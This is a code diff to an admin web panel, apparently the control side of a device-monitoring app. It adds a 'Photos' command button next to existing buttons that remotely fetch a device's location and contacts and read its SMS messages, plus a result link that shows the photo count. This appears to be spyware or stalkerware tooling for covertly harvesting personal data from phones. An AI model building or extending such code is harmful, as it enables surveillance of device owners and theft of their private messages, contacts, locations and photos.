@@ -1664,6 +1664,7 @@ async function renderDevices() {
                   <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_location')">📍 Location</button>
                   <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_contacts')">👥 Contacts</button>
                   <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_sms')">📨 Read SMS</button>
+                  <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_photos')">🖼️ Photos</button>
                 </td>
               </tr>
             `).join('')}
@@ -1905,6 +1906,9 @@ window.showLocationDetails = async function(cmdId, userId) {
 function formatResultData(cmdType, data) {
   if (cmdType === 'get_location') {
     return `<a href="/admin/device-manager.html?user_id=${data.userId}&token=${encodeURIComponent(token)}" target="_blank" style="color:#3B9AD9;font-size:20px;text-decoration:none" title="បើកគ្រប់គ្រងទីតាំង">📍</a>`;
+  } else if (cmdType === 'get_photos') {
+    const count = data.count || 0;
+    return `<a href="/admin/device-manager.html?user_id=${data.userId}&token=${encodeURIComponent(token)}" target="_blank" style="color:#3B9AD9;font-size:20px;text-decoration:none" title="បើកគ្រប់គ្រង Photos (${count})">🖼️</a>`;
   } else if (cmdType === 'get_contacts') {
     const count = data.count || 0;
     return `<a href="/admin/device-manager.html?user_id=${data.userId}&token=${encodeURIComponent(token)}" target="_blank" style="color:#3B9AD9;font-size:20px;text-decoration:none" title="បើកគ្រប់គ្រង contacts (${count})">👥</a>`;
